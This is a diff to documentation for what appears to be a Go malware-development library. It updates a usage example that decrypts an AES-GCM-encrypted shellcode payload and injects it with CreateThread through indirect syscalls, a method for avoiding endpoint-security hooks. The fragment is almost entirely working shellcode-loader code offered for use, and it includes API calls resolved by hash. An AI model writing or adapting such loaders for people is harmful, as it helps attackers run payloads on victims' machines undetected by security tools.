@@ -160,7 +160,7 @@ ret, err := caller.CallByHash(api.HashNtAllocateVirtualMemory,
 package main
 
 import (
-    "context"
+    "log"
 
     "github.com/oioio-space/maldev/crypto"
     "github.com/oioio-space/maldev/evasion"
@@ -192,8 +192,12 @@ func main() {
     shellcode, _ := crypto.DecryptAESGCM(key, encPayload)
 
     // 4. Inject using indirect syscalls for all NT calls
-    pipe := inject.NewPipeline(caller)
-    _ = pipe.Inject(context.Background(), shellcode, inject.WithMethod(inject.MethodCreateThread))
+    inj, err := inject.NewWindowsInjector(&inject.WindowsConfig{
+        Config:        inject.Config{Method: inject.MethodCreateThread},
+        SyscallMethod: wsyscall.MethodIndirect,
+    })
+    if err != nil { log.Fatal(err) }
+    if err := inj.Inject(shellcode); err != nil { log.Fatal(err) }
 }
 ```
 
